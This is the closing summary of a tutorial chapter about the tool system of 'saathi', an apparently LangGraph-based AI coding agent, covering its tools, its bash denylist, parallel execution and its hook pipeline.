This chapter covered every aspect of saathi's tool system, from the conceptual level to the implementation details.

The key points:

1. **Tools are functions the LLM can call.** `@tool` converts a Python function into a schema-equipped callable.

2. **The docstring is the most important thing.** It directly determines whether the model uses the tool correctly. Write docstrings for the model, not for human developers.

3. **All 15 saathi tools** cover filesystem (read, write, patch, list), shell (run_bash), search (in-file, across-files, web), memory (save, recall), and git (status, diff, staged, log, commit).

4. **`run_bash` has a denylist** for the most dangerous shell patterns. The check is substring-based and runs before the subprocess is spawned.

5. **File snapshots use `setdefault`** to capture the FIRST version of each file touched, enabling accurate `/diff` output even after repeated edits.

6. **Saathi's custom tool node** replaces the prebuilt `ToolNode` to add hooks, bounded parallelism via `asyncio.Semaphore`, and MCP content normalization.

7. **`_result_to_text`** normalizes both plain strings (built-in tools) and MCP content block lists to plain text for the ToolMessage.

8. **Every tool call is answered.** The invariant holds by construction — every code path in `_run_one` returns a ToolMessage, including blocked calls, unknown tools, and exceptions.

9. **Parallel execution** is real: `asyncio.gather` runs all tool calls concurrently, reducing multi-tool turns from seconds to milliseconds.

10. **The semaphore cap** prevents overwhelming Ollama or the filesystem with too many simultaneous requests.

11. **Hook integration** provides a gatekeeping pipeline: `check_block` → `run_pre_tool` → execute → `run_post_tool`.

12. **Async tools** are preferred for IO-bound work. Synchronous tools work via thread pool executor but block the event loop during execution.

13. **Adding a new tool** requires four steps: write the function with `@tool`, add it to `ALL_TOOLS`, write a test. The model picks it up automatically on next startup.

The tool system is where saathi's intelligence meets the real world. A thoughtful collection of well-documented tools, combined with the parallel execution engine and hooks system, makes the agent capable of real development work rather than just clever conversation.

---

Previous: Chapter 6 — Agent State and Reducers: The Heart of LangGraph

Next: Chapter 8 — The Checkpointing System: Persistence, Rollback, and Branching
